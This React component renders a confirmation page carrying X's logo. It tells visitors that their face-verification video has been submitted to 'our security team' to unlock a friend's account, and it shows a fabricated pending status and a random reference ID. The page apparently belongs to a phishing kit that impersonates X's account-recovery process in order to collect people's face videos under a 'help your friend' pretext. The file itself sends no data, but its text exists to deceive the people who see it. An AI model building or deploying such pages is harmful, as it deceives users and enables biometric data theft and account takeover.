import { useNavigate } from 'react-router-dom'
import './Success.css'

function Success() {
  const navigate = useNavigate()

  return (
    <div className="success-page">
      <div className="success-container">
        {/* X Logo */}
        <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
          <g>
            <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
          </g>
        </svg>

        <div className="success-icon">
          <svg viewBox="0 0 24 24" width="80" height="80" fill="#00ba7c">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
          </svg>
        </div>

        <h1 className="success-title">Verification Submitted!</h1>
        
        <p className="success-description">
          Thank you for helping your friend! Your face verification has been 
          submitted successfully. Our security team will review your submission 
          within 24-48 hours to unlock your friend's account.
        </p>

        <div className="success-info">
          <div className="info-row">
            <span className="info-label">Status:</span>
            <span className="info-value pending">Pending Review</span>
          </div>
          <div className="info-row">
            <span className="info-label">Submitted:</span>
            <span className="info-value">{new Date().toLocaleString()}</span>
          </div>
          <div className="info-row">
            <span className="info-label">Reference ID:</span>
            <span className="info-value">#{Math.random().toString(36).substr(2, 9).toUpperCase()}</span>
          </div>
        </div>

        <div className="success-steps">
          <h3>What happens next?</h3>
          <ol>
            <li>Our security team will review your face verification video</li>
            <li>We'll verify your identity to confirm the account unlock request</li>
            <li>Your friend will receive an email notification with the results</li>
            <li>If approved, your friend's account access will be fully restored</li>
            <li>If additional verification is needed, we'll contact you or your friend</li>
          </ol>
        </div>

        <button className="btn-done" onClick={() => navigate('/')}>
          Return to Home
        </button>

        <p className="support-text">
          Need help? Visit our <a href="#">Help Center</a> or <a href="#">Contact Support</a>
        </p>
      </div>
    </div>
  )
}

export default Success
